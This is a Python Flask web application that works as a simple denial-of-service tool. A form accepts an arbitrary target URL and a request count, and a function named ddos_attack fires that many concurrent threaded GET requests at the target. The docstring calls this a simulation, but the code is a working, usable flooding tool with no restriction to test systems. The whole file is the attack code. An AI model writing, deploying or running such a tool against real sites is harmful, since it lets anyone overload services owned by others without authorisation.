from flask import Flask, render_template, request, redirect, url_for
import requests
import threading

app = Flask(__name__)

results = ""

def send_request(url, output):
    """Send a single HTTP GET request to the target URL."""
    try:
        response = requests.get(url)
        output.append(f"Request sent to {url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        output.append(f"Error sending request to {url}: {e}")

def ddos_attack(url, num_requests):
    """Simulate a DDoS attack by sending multiple requests to the target URL."""
    threads = []
    output = []
    
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url, output))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
    
    return "\n".join(output)

@app.route("/", methods=["GET", "POST"])
def index():
    global results
    if request.method == "POST":
        url = request.form["url"]
        num_requests = int(request.form["num_requests"])
        results = ddos_attack(url, num_requests)
        return redirect(url_for('index'))
    
    return render_template("index.html", results=results)

if __name__ == "__main__":
    app.run(debug=True)
